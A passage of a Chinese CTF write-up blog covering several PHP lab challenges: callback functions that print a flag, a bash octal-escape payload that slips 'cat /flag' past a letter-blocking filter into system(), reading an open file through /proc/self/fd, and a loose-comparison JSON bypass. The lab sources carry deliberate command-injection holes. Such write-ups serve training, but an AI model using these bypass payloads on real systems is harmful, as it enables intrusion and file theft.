+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&#34;submit&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$user_content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">hello_ctf</span><span class="p">(</span><span class="nv">$random_func</span><span class="p">,</span> <span class="nv">$user_content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">start</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>flag放进了变量$flag中,random_func中的函数都是可以通过回调等方式进行输出flag的值</p>
+<p>官方WP中是这样写的:</p>
+<blockquote>
+<p>函数</p>
+<p>说明</p>
+<p>示例代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${}
+</span></span></code></pre></div><p>用于复杂的变量解析，通常在字符串内用来解析变量或表达式。可以配合 <code>eval</code> 或其他动态执行代码的功能，用于间接执行代码。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval(&#39;${flag}&#39;);
+</span></span><span class="line"><span class="cl">eval()
+</span></span></code></pre></div><p>用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval(&#39;echo $flag;&#39;);
+</span></span><span class="line"><span class="cl">assert()
+</span></span></code></pre></div><p>测试表达式是否为真。PHP 8.0.0 之前，如果 <code>assertion</code> 是字符串，将解释为 PHP 代码并通过 <code>eval()</code> 执行。<strong>PHP 8.0.0 后移除该功能。</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">assert(print_r($flag));
+</span></span><span class="line"><span class="cl">call_user_func()
+</span></span></code></pre></div><p>用于调用回调函数，可以传递多个参数给回调函数，返回回调函数的返回值。适用于动态函数调用。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">call_user_func(&#39;print_r&#39;, $flag);
+</span></span><span class="line"><span class="cl">create_function()
+</span></span></code></pre></div><p>创建匿名函数，接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用。<strong>自 PHP 7.2.0 起被_废弃_，并自 PHP 8.0.0 起被_移除_。</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">create_function(&#39;$a&#39;, &#39;echo $flag;&#39;)($a);
+</span></span><span class="line"><span class="cl">array_map()
+</span></span></code></pre></div><p>将回调函数应用于数组的每个元素，返回一个新数组。适用于转换或处理数组元素。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array_map(print_r($flag), $a);
+</span></span><span class="line"><span class="cl">call_user_func_array()
+</span></span></code></pre></div><p>调用回调函数，并将参数作为数组传递。适用于动态参数数量的函数调用。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">call_user_func_array(print_r($flag), array());
+</span></span><span class="line"><span class="cl">usort()
+</span></span></code></pre></div><p>对数组进行自定义排序，接受数组和比较函数作为参数。适用于根据用户定义的规则排序数组元素。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">usort($a,print_r($flag));
+</span></span><span class="line"><span class="cl">array_filter()
+</span></span></code></pre></div><p>过滤数组元素，如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于false的元素。适用于基于条件移除数组中的元素。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array_filter($a,print_r($flag));
+</span></span><span class="line"><span class="cl">array_reduce()
+</span></span></code></pre></div><p>迭代一个数组，通过回调函数将数组的元素逐一减少到单一值。接受数组、回调函数和可选的初始值。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array_reduce($a,print_r($flag));
+</span></span><span class="line"><span class="cl">preg_replace()
+</span></span></code></pre></div><p>执行正则表达式的搜索和替换。可以是单个字符串或数组。适用于基于模式匹配修改文本内容。<strong>依赖 /e 模式，该模式自 PHP7.3 起被取消。</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">preg_replace(&#39;/(.*)/ei&#39;, &#39;strtolower(&#34;\\1&#34;)&#39;, ${print_r($flag)});
+</span></span><span class="line"><span class="cl">ob_start()
+</span></span></code></pre></div><p>ob_start — 打开输出控制缓冲,可选回调函数作为参数来处理缓冲区内容。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ob_start(print_r($flag));
+</span></span></code></pre></div></blockquote>
+<h4 id="rce-labs-level9">RCE-labs-level9
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: 探姬
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2024-08-11 14:34
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Repo:   github.com/ProbiusOfficial/RCE-labs
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email:  admin@hello-ctf.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link:   hello-ctf.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_八进制转义 ---
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck
+</span></span></span><span class="line"><span class="cl"><span class="cm">你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/
+</span></span></span><span class="line"><span class="cl"><span class="cm">题目本身也提供一个/exp.php方便你使用
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">从该关卡开始你会发现我们在Dockerfile中添加了一行改动：
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">RUN ln -sf /bin/bash /bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">这是由于在PHP中，system是执行sh的，sh通常只是一个软连接，并不是真的有一个shell叫sh。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash，我们用的底层镜像 php:7.3-fpm-alpine 默认指向的 /bin/busybox ，要验证这一点，你可以对 /bin/sh 使用 ls -l 命令查看，在这个容器中，你会得到下面的回显：
+</span></span></span><span class="line"><span class="cl"><span class="cm">bash-5.1# ls -l /bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cm">lrwxrwxrwx    1 root     root            12 Mar 16  2022 /bin/sh -&gt; /bin/busybox
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">我们需要用到的特性只有bash才支持，请记住这一点，这也是我们手动修改指向的原因。
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">在这个关卡主要利用的是在终端中，$&#39;\xxx&#39;可以将八进制ascii码解析为字符，仅基于这个特性，我们可以将传入的命令的每一个字符转换为$&#39;\xxx\xxx\xxx\xxx&#39;的形式，但是注意，这种方式在没有空格的情况下无法执行带参数的命令。
+</span></span></span><span class="line"><span class="cl"><span class="cm">比如&#34;ls -l&#34;也就是$&#39;\154\163\40\55\154&#39; 只能拆分为$&#39;\154\163&#39; 空格 $&#39;\55\154&#39;三部分。
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">bash-5.1# $&#39;\154\163\40\55\154&#39;
+</span></span></span><span class="line"><span class="cl"><span class="cm">bash: ls -l: command not found
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">bash-5.1# $&#39;\154\163&#39; $&#39;\55\154&#39;
+</span></span></span><span class="line"><span class="cl"><span class="cm">total 4
+</span></span></span><span class="line"><span class="cl"><span class="cm">-rw-r--r--    1 www-data www-data       829 Aug 14 19:39 index.php
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">hello_shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z</span><span class="se">\&#34;</span><span class="s2">%*+,-.\/:;=&gt;?@[\]^`|]/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;WAF!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">hello_shell</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>payload: <code>?cmd=$'\143\141\164'  $'\57\146\154\141\147'</code></p>
+<h4 id="rce-labs-level10">RCE-labs-level10
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: 探姬
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2024-08-11 14:34
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Repo:   github.com/ProbiusOfficial/RCE-labs
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email:  admin@hello-ctf.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link:   hello-ctf.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">--- HelloCTF - RCE靶场 : 命令执行 - bash终端的无字母命令执行_二进制整数替换 --- 
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">题目已经拥有成熟脚本：https://github.com/ProbiusOfficial/bashFuck
+</span></span></span><span class="line"><span class="cl"><span class="cm">你也可以使用在线生成：https://probiusofficial.github.io/bashFuck/
+</span></span></span><span class="line"><span class="cl"><span class="cm">题目本身也提供一个/exp.php方便你使用
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">本关卡的考点为终端中支持 $((2#binary)) 解析二进制数据。
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">hello_shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z2-9</span><span class="se">\&#34;</span><span class="s2">%*+,-.\/:;=&gt;?@[\]^`|]/&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;WAF!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">hello_shell</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h4 id="青岑web入门basic_14">青岑/web入门/basic_14
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;/admin_secret.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">17</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">readfile</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s2">&#34;The filename parameter does not exist or the filename is too long&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><p>最开始我尝试的方向是绕过strlen()函数,通过搜索得知当传递数组时会抛出 Warning 警告，函数返回 <strong><code>null</code></strong>,此时长度的限制似乎是绕过了,但readfile()无法解析数组</p>
+<p>后来问了AI,得知这道题的考点是 Linux /proc文件系统与文件描述符的利用:</p>
+<p>由于:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$flag</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;/admin_secret.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
+</span></span></code></pre></div><p>这行代码的作用是以只读方式打开目标文件,并将文件句柄赋值给 <code>$flag</code>.在脚本执行期间,这个文件处于被打开的状态.</p>
+<p>在Linux系统中,当一个进程打开一个文件时,系统会在 <code>/proc/self/fd/</code>目录下为该文件创建一个符号链接,链接的名称及是文件描述符( File Descriptor) 的数字.</p>
+<p>所以这里目标文件以及被当前PHP进程打开,我们只需要读 <code>/proc/self/fd</code> 加对应的数字,就可以读取<code>admin_secret.txt</code>了</p>
+<p>所以可以<code>?filename=/proc/self/fd/1</code> 从1开始一直试 就能拿到flag</p>
+<p>另外,也可以用<code>?filename=/dev/fd/</code>来读取</p>
+<p>因为<code>/dev/fd</code>本质是<code>/proc/self/fd</code>的软链接(快捷方式),在linux系统中,<code>/dev/fd</code>是一个指向<code>/proc/self/fd</code>的符号链接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -l /dev/fd
+</span></span><span class="line"><span class="cl">lrwxrwxrwx root root <span class="m">13</span> B Fri Jun <span class="m">19</span> 09:52:23 <span class="m">2026</span>  /dev/fd ⇒ /proc/self/fd
+</span></span></code></pre></div><p>所以如果字符长度进一步限制的话,就可以使用<code>/dev/fd</code>来读文件了.</p>
+<h4 id="青岑web入门ezphp_2">青岑/web入门/ezphp_2
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;qc&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;qc&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;no&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$qc</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;qc&#39;</span><span class="p">],</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$qc</span><span class="p">[</span><span class="s2">&#34;n&#34;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$qc</span><span class="p">[</span><span class="s2">&#34;n&#34;</span><span class="p">])</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$qc</span><span class="p">[</span><span class="s2">&#34;n&#34;</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">array_search</span><span class="p">(</span><span class="s2">&#34;QCCTF&#34;</span><span class="p">,</span> <span class="nv">$qc</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">array_search</span><span class="p">(</span><span class="s2">&#34;QCyyds&#34;</span><span class="p">,</span> <span class="nv">$qc</span><span class="p">[</span><span class="s2">&#34;n&#34;</span><span class="p">])</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$qc</span><span class="p">[</span><span class="s2">&#34;n&#34;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$val</span> <span class="o">===</span> <span class="s2">&#34;QCyyds&#34;</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no......&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span></code></pre></div><p>代码逻辑分析</p>
+<p>我们要拿到 <code>$flag</code>，必须依次绕过以下几个检查：</p>
+<ol>
+<li>存在且非空：<code>qc</code> 参数必须存在且不能是空字符串。</li>
+<li>JSON 解码与结构：<code>qc</code> 必须是一个合法的 JSON 字符串，解码后必须包含键 <code>&quot;n&quot;</code>，且 <code>&quot;n&quot;</code> 的值必须是一个非空数组。</li>
+<li>顶层查找 &ldquo;QCCTF&rdquo;：<code>array_search(&quot;QCCTF&quot;, $qc) === false</code> 会返回假（即必须找到）。这意味着在 <code>$qc</code> 这个数组中，必须有一个值等于 <code>&quot;QCCTF&quot;</code>。</li>
+<li>内层查找 &ldquo;QCyyds&rdquo;：<code>array_search(&quot;QCyyds&quot;, $qc[&quot;n&quot;]) === false</code> 同理，在 <code>$qc[&quot;n&quot;]</code> 数组中，必须有一个值等于 <code>&quot;QCyyds&quot;</code>。</li>
+<li>严格排除 &ldquo;QCyyds&rdquo;：<code>foreach</code> 循环检查 <code>$qc[&quot;n&quot;]</code> 中不能存在全等于 (<code>===</code>) 字符串 <code>&quot;QCyyds&quot;</code> 的元素。</li>
+</ol>
+<p>这里的关键在于 <code>array_search()</code> 函数。在 PHP 中，<code>array_search()</code> 默认使用的是松散比较 (<code>==</code>)。</p>
+<p>在 PHP 松散比较中，任何字符串与数字 <code>0</code> 比较时，字符串会被强制转换为数字。而非数字开头的字符串（如 <code>&quot;QCCTF&quot;</code>, <code>&quot;QCyyds&quot;</code>）转换成数字后就是 <code>0</code>。</p>
+<p>因此：</p>
+<ul>
+<li><code>0 == &quot;QCCTF&quot;</code> 结果为 True</li>
+<li><code>0 == &quot;QCyyds&quot;</code> 结果为 True</li>
+</ul>
+<p>但是，全等于比较时类型不同：</p>
+<ul>
+<li><code>0 === &quot;QCyyds&quot;</code> 结果为 False</li>
+</ul>
+<p>根据以上分析，我们可以用整数 <code>0</code> 来代替字符串，完美绕过所有的 <code>array_search</code> 和 <code>foreach</code> 限制。</p>
+<p>我们需要构造的 PHP 数组结构如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$qc</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;n&#34;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="mi">0</span><span class="p">],</span>  <span class="c1">// &#34;n&#34; 是一个包含 0 的数组。0 == &#34;QCyyds&#34; 为真，但 0 === &#34;QCyyds&#34; 为假。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mi">0</span>     <span class="c1">// 随便给一个顶层键，值为 0，用于绕过 0 == &#34;QCCTF&#34;。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">];</span>
+</span></span></code></pre></div><p>将这个数组转为 JSON 字符串：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;n&#34;</span><span class="p">:[</span><span class="mi">0</span><span class="p">],</span><span class="nt">&#34;x&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">}</span>
+</span></span></code></pre></div><p>将这个 JSON 字符串作为 <code>qc</code> 参数的值发送</p>
+<p>最终 GET 请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?qc={&#34;n&#34;:[0],&#34;x&#34;:0}
+</span></span></code></pre></div><p>当你传入 <code>?qc={&quot;n&quot;:[0],&quot;x&quot;:0}</code> 时：</p>
+<ol>
+<li><code>isset($_GET['qc'])</code> 为真，非空，继续。</li>
+<li><code>json_decode</code> 解析成功，<code>$qc[&quot;n&quot;]</code> 是数组 <code>[0]</code>，非空，继续。</li>
+<li><code>array_search(&quot;QCCTF&quot;, $qc)</code>：在 <code>$qc</code> 的值（<code>[0]</code> 和 <code>0</code>）中找 <code>&quot;QCCTF&quot;</code>。因为 <code>0 == &quot;QCCTF&quot;</code> 为真，找到了，返回键名，不等于 <code>false</code>，继续。</li>
+<li><code>array_search(&quot;QCyyds&quot;, $qc[&quot;n&quot;])</code>：在 <code>$qc[&quot;n&quot;]</code> 的值（<code>0</code>）中找 <code>&quot;QCyyds&quot;</code>。因为 <code>0 == &quot;QCyyds&quot;</code> 为真，找到了，返回键名 0，不等于 <code>false</code>，继续。</li>
+<li><code>foreach</code> 循环：检查 <code>$qc[&quot;n&quot;]</code> 中的元素 <code>0</code> 是否 <code>=== &quot;QCyyds&quot;</code>。因为 <code>0 === &quot;QCyyds&quot;</code> 为假，不退出，继续。</li>
+<li>成功走到 <code>echo $flag;</code></li>
+</ol>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/redos%E5%8F%8Aphp%E6%AD%A3%E5%88%99%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ReDos及PHP正则回溯绕过学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/n1ctf2025-n1cat1/3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">N1CTF2025 n1cat(1/3)</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2026 Oight
+    </section>
+    
+    <section class="powerby">
+        
+            Build by Oight <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
